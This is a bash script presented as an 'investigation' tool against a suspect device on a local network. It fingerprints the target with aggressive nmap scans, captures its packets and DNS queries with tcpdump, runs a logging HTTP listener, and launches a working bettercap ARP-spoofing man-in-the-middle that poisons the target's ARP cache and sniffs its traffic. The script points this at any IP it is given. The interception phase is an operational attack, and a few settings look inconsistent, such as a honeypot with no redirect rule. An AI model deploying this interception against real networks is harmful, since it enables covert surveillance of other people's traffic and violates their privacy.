#!/usr/bin/env bash
#
# investigate.sh — evidence gathering against an unauthorized device on your LAN.
# Usage: ./investigate.sh <suspect-ip>
# All output is logged with timestamps for legal documentation.

if [ "$EUID" -ne 0 ]; then
  exec sudo env PATH="$PATH" "$0" "$@"
fi

SUSPECT_IP="${1:-}"
if [ -z "$SUSPECT_IP" ]; then
  echo "Usage: $0 <suspect-ip>"
  exit 1
fi

IFACE=$(ip route | awk '/default/ {print $5; exit}')
GW_IP=$(ip route | awk '/default/ {print $3; exit}')
SELF_IP=$(ip -4 addr show dev "$IFACE" | awk '/inet / {print $2}' | cut -d/ -f1)
LOGDIR="/tmp/investigation_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$LOGDIR"

log()  { echo "[$(date '+%Y-%m-%d %H:%M:%S')] $*" | tee -a "$LOGDIR/investigation.log"; }
sep()  { log "------------------------------------------------------------"; }

log "============================================================"
log "Investigation started"
log "Target: $SUSPECT_IP  |  Interface: $IFACE  |  Gateway: $GW_IP"
log "Evidence directory: $LOGDIR"
log "============================================================"

# --- Phase 1: OS and device fingerprint -------------------------------------
sep
log "PHASE 1: Device fingerprinting (nmap)"
sep

if command -v nmap &>/dev/null; then
  # -O: OS detection  -sV: service/version  -A: aggressive fingerprint
  # --osscan-guess: guess even with limited info
  # -T2: polite timing — less noisy on the network
  nmap -O -sV -A --osscan-guess -T2 "$SUSPECT_IP" 2>&1 \
    | tee "$LOGDIR/nmap_fingerprint.txt" \
    | grep -E 'MAC Address|OS details|Running|Device type|open|filtered' \
    | while read -r line; do log "$line"; done
else
  log "[!] nmap not available — skipping fingerprint phase"
fi

# --- Phase 2: passive traffic capture (DNS reveals everything) --------------
sep
CAPTURE_DURATION=120
log "PHASE 2: Passive capture — ${CAPTURE_DURATION}s of all traffic from $SUSPECT_IP"
log "         DNS queries will reveal apps, OS, services used."
sep

PCAP="$LOGDIR/suspect_traffic.pcap"
timeout "$CAPTURE_DURATION" tcpdump -i "$IFACE" -n -w "$PCAP" \
  "host $SUSPECT_IP" 2>&1 | tee -a "$LOGDIR/investigation.log" &
TCPDUMP_PID=$!

log "Capture running (PID $TCPDUMP_PID) — will stop after ${CAPTURE_DURATION}s"
log "Live DNS queries:"

# stream DNS queries in real time to the log
timeout "$CAPTURE_DURATION" tcpdump -i "$IFACE" -n -l \
  "src $SUSPECT_IP and udp port 53" 2>/dev/null \
  | awk '{print $0; fflush()}' \
  | while read -r line; do log "DNS: $line"; done

wait $TCPDUMP_PID 2>/dev/null

# parse and summarize DNS queries from pcap
if command -v tcpdump &>/dev/null && [ -f "$PCAP" ]; then
  log ""
  log "DNS domains queried by suspect:"
  tcpdump -r "$PCAP" -n "udp port 53" 2>/dev/null \
    | grep -oP ' A\? \K[^ ]+' \
    | sort -u \
    | while read -r domain; do log "  -> $domain"; done
fi

# --- Phase 3: Honeypot — fake HTTP server that logs everything --------------
sep
HONEYPOT_PORT=8080
log "PHASE 3: HTTP honeypot on port $HONEYPOT_PORT"
log "         ARP-spoof will redirect suspect's HTTP traffic here."
sep

python3 - "$LOGDIR" "$HONEYPOT_PORT" << 'PYEOF' &
import sys, http.server, datetime, json

logdir = sys.argv[1]
port   = int(sys.argv[2])

class Honeypot(http.server.BaseHTTPRequestHandler):
    def log_message(self, fmt, *args): pass  # suppress default output

    def handle_request(self):
        entry = {
            "time":       datetime.datetime.now().isoformat(),
            "client_ip":  self.client_address[0],
            "method":     self.command,
            "path":       self.path,
            "user_agent": self.headers.get("User-Agent", ""),
            "host":       self.headers.get("Host", ""),
            "headers":    dict(self.headers),
        }
        line = json.dumps(entry)
        print(line, flush=True)
        with open(f"{logdir}/honeypot_hits.jsonl", "a") as f:
            f.write(line + "\n")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"<html><body>OK</body></html>")

    do_GET  = handle_request
    do_POST = handle_request
    do_HEAD = handle_request

http.server.HTTPServer(("0.0.0.0", port), Honeypot).serve_forever()
PYEOF

HONEYPOT_PID=$!
log "Honeypot running (PID $HONEYPOT_PID) — logging to $LOGDIR/honeypot_hits.jsonl"

# --- Phase 4: ARP MITM — route suspect traffic through this machine ---------
sep
log "PHASE 4: ARP spoofing — intercepting suspect's traffic"
log "         This poisons the suspect's ARP cache to route through us."
sep

if ! command -v bettercap &>/dev/null; then
  log "[!] bettercap not available. Run: devenv shell  (after updating devenv.nix)"
  log "    Then re-run this script."
else
  # enable IP forwarding so intercepted traffic still reaches the internet
  echo 1 > /proc/sys/net/ipv4/ip_forward
  log "IP forwarding enabled"

  # bettercap: ARP spoof only the suspect, log all DNS, HTTP headers
  cat > "$LOGDIR/bettercap.cap" << CAPEOF
set arp.spoof.targets $SUSPECT_IP
set arp.spoof.internal true
arp.spoof on
set dns.spoof.domains *
set net.sniff.verbose false
set net.sniff.filter src $SUSPECT_IP
net.sniff on
CAPEOF

  log "Starting bettercap MITM (Ctrl+C to stop investigation)..."
  bettercap -iface "$IFACE" -caplet "$LOGDIR/bettercap.cap" \
    2>&1 | tee -a "$LOGDIR/bettercap.log" &
  BETTERCAP_PID=$!
  log "bettercap running (PID $BETTERCAP_PID)"
fi

# --- Wait and cleanup -------------------------------------------------------
log ""
log "Investigation active. Press Ctrl+C to stop and generate report."
trap cleanup INT TERM

cleanup() {
  log ""
  sep
  log "Stopping investigation..."
  kill $HONEYPOT_PID $BETTERCAP_PID 2>/dev/null
  echo 0 > /proc/sys/net/ipv4/ip_forward
  log "IP forwarding disabled"
  log ""
  log "EVIDENCE SUMMARY"
  sep
  log "All files in: $LOGDIR"
  ls -lh "$LOGDIR" | while read -r line; do log "  $line"; done
  log ""
  if [ -f "$LOGDIR/honeypot_hits.jsonl" ]; then
    count=$(wc -l < "$LOGDIR/honeypot_hits.jsonl")
    log "Honeypot hits: $count"
    if [ "$count" -gt 0 ]; then
      log "User-Agents seen (device identity):"
      jq -r '.user_agent' "$LOGDIR/honeypot_hits.jsonl" 2>/dev/null | sort -u \
        | while read -r ua; do log "  $ua"; done
    fi
  fi
  log ""
  log "Investigation complete. Log: $LOGDIR/investigation.log"
  exit 0
}

wait
